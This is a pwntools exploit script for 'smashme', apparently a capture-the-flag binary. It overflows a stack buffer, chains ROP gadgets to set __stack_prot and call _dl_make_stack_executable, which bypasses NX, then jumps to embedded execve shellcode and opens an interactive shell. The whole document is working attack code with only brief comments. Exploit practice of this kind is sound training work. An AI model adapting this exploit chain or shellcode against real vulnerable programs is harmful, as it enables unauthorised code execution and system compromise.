#if binary protected by NX bit!!
'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
'''
from pwn import *

context.log_level='debug'

binary='smashme'

s=process(binary)
raw_input('start')
e=ELF(binary)
rop=ROP(binary)

shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

__stack_prot=0x6c8fe0
__libc_stack_end=0x6c8f90
_dl_make_stack_executable=0x0473ee0
call_rsp=0x400bfc
poprcx_ret=0x0000000000490db3
poprax_ret=0x00000000004c3b28
poprdi_ret=0x00000000004014d6

s.recvuntil('Welcome to the Dr. Phil Show. Wanna smash?')

payload='Smash me outside, how bout dAAAAAAAAAAA'
payload+='\x90'*(0x48-len(payload))

#__stack_prot = 7
payload+=p64(poprcx_ret)
#objdump -D ./smashme | grep "__stack_prot"
payload+=p64(__stack_prot)

payload+=p64(poprax_ret)
payload+=p64(0x7)

#add    BYTE PTR [rcx],al ; ret
payload+=p64(0x0000000000400969)

#rid=__libc_stack_end
payload+=p64(poprdi_ret)
#objdump -D ./smashme | grep "__libc_stack_end"
payload+=p64(__libc_stack_end)

payload+=p64(_dl_make_stack_executable)

payload+=p64(call_rsp)

payload+=shellcode

s.sendline(payload)

s.interactive()
